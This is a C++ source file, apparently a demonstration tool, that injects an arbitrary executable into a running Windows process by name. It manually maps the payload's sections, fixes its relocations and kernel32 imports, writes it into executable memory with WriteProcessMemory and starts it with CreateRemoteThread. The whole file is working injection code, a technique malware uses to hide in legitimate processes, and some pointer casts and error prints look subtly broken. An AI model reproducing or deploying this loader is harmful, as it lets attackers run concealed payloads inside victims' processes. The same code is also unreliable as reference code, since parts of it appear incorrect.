/*==============================================================
Example program used to inject executable PE into target process.

Program execution flow:
    1) payload PE is mapped into memory at faddr.
	2) memory is allocated for payload in target process (imgVA).
	3) PE headers are used to load PE into local buffer buff.
		a) DOS stub and optional headers mapped into buff.
		b) sections mapped to appropriate VA's in buff.
		c) imgVA var in data section of payload (now in buff) is replaced with actual imgVA.
		d) fix IAT of kernal32
		e) offsets from relocation table are adjusted to match new imagebase (imgVA).
	4) buff is copied into target process address space (imgVA).
	5) payload is executed in target process using remote thread.
	6) payload contains and runs code to load dlls and fix rest of import table.
================================================================*/

#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>
#include <string>

/*==============================================================
                       Function Prototypes
================================================================*/

DWORD FindPID(std::string name);

int WriteSectionsAndHeaders( PIMAGE_NT_HEADERS imgNtHeaders, PVOID &buff, HANDLE faddr, HANDLE phandle);

int injectImgVA( PIMAGE_NT_HEADERS imgNtHeaders, PVOID &buff, PVOID imgVA, HANDLE faddr, HANDLE phandle);

int FixAddressRelocations(PIMAGE_NT_HEADERS &imgNtHeaders, PVOID &buff, ULONG64 delta);

int FixImportTables(PIMAGE_NT_HEADERS &imgNtHeaders, PVOID &buff);

/*==============================================================
                       Main Function
================================================================*/

int main( int argc, char **argv)
{
    HANDLE phandle = GetCurrentProcess();

	//Parse args
	if(argc != 3)
	{
		printf("Usage: [target.exe] [payload.exe]\n");
		exit(1);
	}
	char* targetName = argv[1];
	std::string payloadName = argv[2];

	//get handle to target process
	DWORD pid = FindPID(targetName);
	HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS,0,pid);

    //Load payload into memory
    HANDLE hf = CreateFile(payloadName.c_str(), GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    int fsize = GetFileSize(hf, NULL);
    PVOID faddr = VirtualAlloc(NULL, fsize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if( !ReadFile(hf, faddr, fsize, NULL, 0) ){printf("failed to read file\n");}
    CloseHandle(hf);

	//Get the optional headers
    IMAGE_DOS_HEADER* imgDosHeader = (IMAGE_DOS_HEADER*) faddr;
    IMAGE_NT_HEADERS* imgNtHeaders = (IMAGE_NT_HEADERS*)((long)faddr + imgDosHeader->e_lfanew);
    
	//allocate the memory. payload will be unloaded into temporary local buffer buff.
	PVOID buff = VirtualAlloc(NULL, imgNtHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	//allocate memory for payload in target process.
    PVOID imgVA = VirtualAllocEx(hproc, (PVOID)imgNtHeaders->OptionalHeader.ImageBase,
        imgNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (imgVA == NULL) //If allocation failed at the requested address, let alloc chose addr.
	{
		imgVA = VirtualAllocEx(hproc, NULL, imgNtHeaders->OptionalHeader.SizeOfImage,
			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	}

	printf("imgVA Addr: %x, buffer Addr: %x\n",imgVA, buff);

	WriteSectionsAndHeaders(imgNtHeaders, buff, faddr, phandle);
	injectImgVA(imgNtHeaders, buff, imgVA, faddr, phandle);
	FixImportTables(imgNtHeaders,buff); //fix IAT of KERNAL32

	//Fix address relocations
	ULONG64 delta = ULONG64(imgVA) - ULONG64(imgNtHeaders->OptionalHeader.ImageBase); //to be added to address offset
	if(delta != 0){ FixAddressRelocations(imgNtHeaders, buff, delta); }

	//Write loaded executeble (stored in buff) into remote memory location (imgVA).
	if(WriteProcessMemory(hproc, imgVA, buff, imgNtHeaders->OptionalHeader.SizeOfImage, NULL) == false)
	{
		DWORD err = GetLastError();
		LPSTR messageBuffer = nullptr;
		FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                                 NULL, err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
		printf("WriteProcessMemory Error: %s\n",messageBuffer);
		exit(1);
	}

    //Execute from entry point
    DWORD ep = (DWORD)imgVA + imgNtHeaders->OptionalHeader.AddressOfEntryPoint;
	printf("Entry Point VA: %x\n",ep);

	HANDLE t = CreateRemoteThread(hproc, NULL, 0,(LPTHREAD_START_ROUTINE)ep, NULL, 0, NULL);
	if(t == NULL)
	{
		printf("Create Remote Thread Error: %s\n",GetLastError());
		exit(1);
	}

	WaitForSingleObject(t,INFINITE);

    return 0;
}

/*==============================================================
                       Function Declarations
================================================================*/

//loop through running processes and return the pid of process "name".
DWORD FindPID(std::string name)
{
    PROCESSENTRY32 process;
    process.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if(Process32First(hSnapshot, (PROCESSENTRY32*)&process))
    {
        do
        {
            if(stricmp(process.szExeFile, name.c_str())==0)
            {
                CloseHandle(hSnapshot);
                return process.th32ProcessID;
            }
        } while(Process32Next(hSnapshot, (PROCESSENTRY32*)&process));
    }

    CloseHandle(hSnapshot);
    return NULL;
    
}

int WriteSectionsAndHeaders( PIMAGE_NT_HEADERS imgNtHeaders, PVOID &buff, HANDLE faddr, HANDLE phandle)
{
	//write the headers
    WriteProcessMemory(phandle, buff, faddr, imgNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

    //Write sections to memory
    IMAGE_SECTION_HEADER* imgSectionHeader = (IMAGE_SECTION_HEADER*)((long)(void*)&imgNtHeaders->OptionalHeader 
		+ (long)imgNtHeaders->FileHeader.SizeOfOptionalHeader);
    for(int i = 0; i < imgNtHeaders->FileHeader.NumberOfSections; i++,imgSectionHeader++)
    {
        WriteProcessMemory(
			phandle, PCHAR(buff) + imgSectionHeader->VirtualAddress,
			PCHAR(faddr) + imgSectionHeader->PointerToRawData,
			imgSectionHeader->SizeOfRawData,
			NULL
		);
    }

	return true;
}

/* payload.exe contains a local variable DWORD imgVA=0xDEADBEEF. This function finds
the variable in the .data section and replaces 0xDEADBEEF with the image base address.*/
int injectImgVA( PIMAGE_NT_HEADERS imgNtHeaders, PVOID &buff, PVOID imgVA, HANDLE faddr, HANDLE phandle)
{
    //Write sections to memory
    IMAGE_SECTION_HEADER* imgSectionHeader = (IMAGE_SECTION_HEADER*)((long)(void*)&imgNtHeaders->OptionalHeader 
		+ (long)imgNtHeaders->FileHeader.SizeOfOptionalHeader);
    for(int i = 0; i < imgNtHeaders->FileHeader.NumberOfSections; i++,imgSectionHeader++)
    {
		//OverWrite value for variable imgVA in injectees data section.
		if(stricmp((char*)imgSectionHeader->Name, ".data")==0)
		{
			DWORD* p = (DWORD*) (PCHAR(buff) + imgSectionHeader->VirtualAddress);
			while(*p != 0xDEADBEEF){p++;} //DWORD imgVa var has hardcoded value of 0xDEADBEEF.
			*p = (DWORD) imgVA; //Replace DEADBEEF with actual address.
			return true;
		}
    }

	return false;
}

//adjust fixups from relocations table.
int FixAddressRelocations(PIMAGE_NT_HEADERS &imgNtHeaders, PVOID &buff, ULONG64 delta)
{
	DWORD offsetFromPage = 0x0FFF; //mask - first 12bits of block are offset from page RVA.
	DWORD flag = 0xF000; //mask - last 4bits of block are flags representing base relocation type.

	IMAGE_DATA_DIRECTORY dataDirectoryBaseReloc = imgNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	IMAGE_BASE_RELOCATION* imgBRT = (IMAGE_BASE_RELOCATION*)(DWORD(buff) + dataDirectoryBaseReloc.VirtualAddress); //the actual table
	DWORD endOfBRT = dataDirectoryBaseReloc.VirtualAddress + dataDirectoryBaseReloc.Size + (DWORD)buff; //end address of base table

	while ((DWORD)imgBRT < endOfBRT) //loop through all relocation pages
	{
		DWORD numOfRelocations = (imgBRT->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		DWORD offsetRVA = imgBRT->VirtualAddress;
		WORD* relocationBlock = (WORD*)(imgBRT + 1);
		for (ULONG64 i = 0; i < numOfRelocations; i++)
		{
			if ((relocationBlock[i] & flag)==0x3000)
			{
				ULONG64 *p;
				p = (PULONG64)((DWORD)buff + offsetRVA + (relocationBlock[i] & offsetFromPage));
				*p += delta;
			}
		}
		imgBRT = (PIMAGE_BASE_RELOCATION)((PUCHAR)imgBRT + imgBRT->SizeOfBlock);
	}
	return true;
}

//Used to link to KERNAL32.DLL. Other DLL's will have to be loaded and linked by payload.
int FixImportTables(PIMAGE_NT_HEADERS &imgNtHeaders, PVOID &buff)
{
	//fix import table and load dlls
    IMAGE_DATA_DIRECTORY ddImportTable = imgNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	IMAGE_IMPORT_DESCRIPTOR* importDescriptor = (IMAGE_IMPORT_DESCRIPTOR*)(DWORD(buff) + ddImportTable.VirtualAddress);
	while (importDescriptor->Name != NULL) //loop through dll import tables
	{
		DWORD dllName = DWORD(buff) + importDescriptor->Name;

		//Get handle to dll
		HMODULE hmDll = GetModuleHandle((LPCSTR)dllName);
		if(hmDll != NULL)
		{
			DWORD* IAT = (DWORD*)(DWORD(buff) + importDescriptor->FirstThunk); //import address table
			DWORD* INT = (DWORD*)(DWORD(buff) + importDescriptor->OriginalFirstThunk); //import name table

			//map each function address to IAT.
			while (*(DWORD*)INT)
			{
				PIMAGE_IMPORT_BY_NAME ibn = PIMAGE_IMPORT_BY_NAME(DWORD(buff) + *(DWORD*)INT);
				DWORD adr = (DWORD)GetProcAddress(hmDll, (LPCSTR)ibn->Name);
				*IAT = adr;
				IAT++;
				INT++;
			}
		}

		importDescriptor = (IMAGE_IMPORT_DESCRIPTOR*)((DWORD)(importDescriptor) + sizeof(IMAGE_IMPORT_DESCRIPTOR));
	}

	return true;
}
